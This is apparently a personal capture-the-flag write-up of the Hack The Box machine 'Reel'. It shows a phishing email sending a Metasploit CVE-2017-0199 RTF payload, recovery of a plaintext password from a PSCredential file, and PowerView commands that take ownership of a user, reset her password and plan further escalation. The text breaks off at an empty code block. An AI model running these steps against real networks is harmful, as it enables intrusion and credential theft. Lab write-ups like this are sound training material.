# SMB (139,445)
So null auth is enabled but cannot use it to enumerate shares or groups

Guest account is disabled

# Phishing leads to user compromise
So im thinking that if SMTP is open i might be able to send emails and ive already been given a hint for sending an rtf file for conversion!

After doing some research on RTF phishing exploits i find metasploit has a module for the associated CVE `CVE-2017-0199`

Ive configured metasploit with an lhost and lport to connect back to and also set the srvhost to my ip where the malicious attachment will be hosted!

```python
sendEmail -f IT@megabank.com -t nico@megabank.com -a /home/kali/.msf4/local/msf.doc -u 'Urgent Action Required!' -m 'Please find attached document for more details!' -s 10.129.16.113

This has sent the emai

Found a file inside `nico` desktop called `cred.xml`

Referenced in the file `pscredential` tells me this could be using `Import-CliXml` and `Export-CliXml` which means i can use those to retrieve the plaintext password

```python
C:\Users\nico\Desktop>powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"

I now have access via SSH

An alternative could have been to upload RunAsCs via meterpreter session then i could execute commands as `tom`

Found an interesting directory in toms desktop called `AD Audit` inside i find a note as well as powerview.ps1 and some bloodhound collection tools

### note.txt
```python
scp tom@reel.htb.local:C:/Users/tom/Desktop/AD\ Audit/note.txt .
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
tom@reel.htb.local's password: 
note.txt
```
Ive used scp to copy it to my machine

```python
cat note.txt  
Findings:

Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).

Maybe we should re-run Cypher query against other groups we've created.
```
Maybe a hint to try and run bloodhound on here!

Im going to try and run bloodhound on here ill upload sharphound using scp, since this is an older machine the collector may be out of date so ill upload the new one!

### acls.csv

Found another file in the same location ill transfer it to my machine with scp

```python
scp tom@reel.htb.local:C:/Users/tom/Desktop/AD\ Audit/BloodHound/Ingestors/acls.csv .
```
This transferred the file

```python
cat acls.csv | grep tom

So it looks like the most interesting part from this output is that `tom` has `writeowner` over `claire`

# Granting full control over `claire` as `tom`

https://www.hackingarticles.in/abusing-ad-dacl-writeowner/

Ill use this article to abuse this!

```python
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Import-Module .\PowerView.ps1                                                      
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity 'claire' -OwnerIdentity 'tom'
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -Rights 'All' -TargetIdentity "claire" -PrincipalIdentity "tom"
```
This imported powerview which was conveniently already there for me, then made `tom` the owner of `claire` from there i could give myself full control over `claire`

```python
PS C:\Users\tom\Desktop\AD Audit\BloodHound> $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force           
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -Identity 'claire' -AccountPassword $NewPassword
```
Now i have GenericAll i can just change the password like ive done here

```python
ssh claire@reel.htb.local

claire@reel.htb.local's password: 

Microsoft Windows [Version 6.3.9600]

claire@REEL C:\Users\claire> 
```
Now i have access to `claire`

## Analysis of `claire` rights
```python
cat acls.csv | grep claire
"Backup_Admins@HTB.LOCAL","GROUP","","claire@HTB.LOCAL","USER","WriteDacl","","AccessAllowed","False"
"claire@HTB.LOCAL","USER","","tom@HTB.LOCAL","USER","WriteOwner","","AccessAllowed","False"

"claire_da@HTB.LOCAL","USER","","Domain Admins@HTB.LOCAL","GROUP","WriteDacl WriteOwner","","AccessAllowed","False"
"claire_da@HTB.LOCAL","USER","","Enterprise Admins@HTB.LOCAL","GROUP","WriteDacl WriteOwner","","AccessAllowed","False"
"claire_da@HTB.LOCAL","USER","","Administrators@HTB.LOCAL","GROUP","WriteDacl WriteOwner","","AccessAllowed","False"

"claire_da@HTB.LOCAL","USER","","Domain Admins@HTB.LOCAL","GROUP","Owner","","AccessAllowed","False"
```
As seen here at the top of the output `claire` has WriteDacl over the backup admins group

So the same thing really i can grant myself GenericAll with WriteDacl then add myself to backup admins then from there im assuming i can backup SAM and SYSTEM

# Adding `claire` to `backup_admins`

https://www.hackingarticles.in/abusing-ad-dacl-writedacl/

Ill use this article to help with this

First ill need to upload PowerView to claire

```python

```
